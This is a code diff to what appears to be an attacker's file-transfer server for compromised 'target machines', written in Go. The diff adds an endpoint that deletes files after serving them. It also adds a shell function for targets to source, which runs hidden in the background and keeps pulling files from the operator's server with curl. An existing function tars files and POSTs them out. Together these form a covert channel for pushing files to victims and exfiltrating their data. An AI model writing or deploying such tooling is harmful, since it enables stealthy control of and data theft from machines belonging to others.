@@ -56,6 +56,21 @@ func DownloadHandler(h http.Handler) http.Handler {
 	})
 }
 
+//Handler for bidirectionnal exchange (target has previously set up a webhook to continuously pull this repo. Once downloaded, file is deleted)
+func BidirectionnalHandler(h http.Handler, cfg *config.Config) http.Handler {
+	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		remote := "(" + r.RemoteAddr + ")"
+		h.ServeHTTP(w, r)
+		file := strings.Join(strings.Split(r.URL.Path, "/")[3:], "/")
+		if file != "" {
+			fmt.Println(color.Green(remote), "Download file", color.Italic("(push to remote)"), ":", color.Bold(file))
+			file = cfg.BidirectionnalDir + "/" + file
+			err := exec.Command("rm", file).Run()
+			check.Check(err, "Error while removing "+file)
+		}
+	})
+}
+
 // ALIAS //
 //Handler that output shortcut aimed for the target machines (source it). It is for linux machines
 func AliasHandler(cfg *config.Config) http.HandlerFunc {
@@ -120,6 +135,31 @@ func AliasHandler(cfg *config.Config) http.HandlerFunc {
 		//pushr
 		pushrFunc := "pushr(){\ntar -cf $1.tar $1 && curl -X POST -F \"file=@$1.tar\" " + url + "/pushr && rm $1.tar\n}\n"
 		fmt.Fprintf(w, pushrFunc)
+
+		//receive
+		if cfg.BidirectionnalDir != "" {
+			receiveFunc := `
+			receive(){
+				while true
+				do
+					FILES=$(curl -s ` + url + `/bidirectional -L | grep "<a" | cut -d "\"" -f 2)
+					#fix zsh bug
+					local IFS=$'\n'
+					if [ $ZSH_VERSION ]; then
+					setopt sh_word_split
+					fi
+					
+					for value in $FILES
+					do
+						curl -s ` + url + `/bidirectional/$value > $value
+					done
+					sleep 5
+				done
+			}
+			(&>/dev/null receive &)
+			`
+			fmt.Fprintf(w, receiveFunc)
+		}
 
 		//gtree
 		gtreeFunc := "gtree(){\ncurl " + url + "/gtree\n}\n"
@@ -272,6 +312,9 @@ func InitHandlers(cfg *config.Config) {
 	//Alias endpoint
 	http.HandleFunc("/"+cfg.Secret+"/alias", AliasHandler(cfg))
 	http.HandleFunc("/"+cfg.Secret+"/aliaswin", AliasWindowsHandler(cfg))
+
+	//"Bidirectional" endpoint
+	http.Handle("/"+cfg.Secret+"/bidirectional/", BidirectionnalHandler(http.StripPrefix("/"+cfg.Secret+"/bidirectional/", http.FileServer(http.Dir(cfg.BidirectionnalDir))), cfg))
 
 	//Tree endpoint
 	http.HandleFunc("/"+cfg.Secret+"/gtree", TreeHandler(cfg))
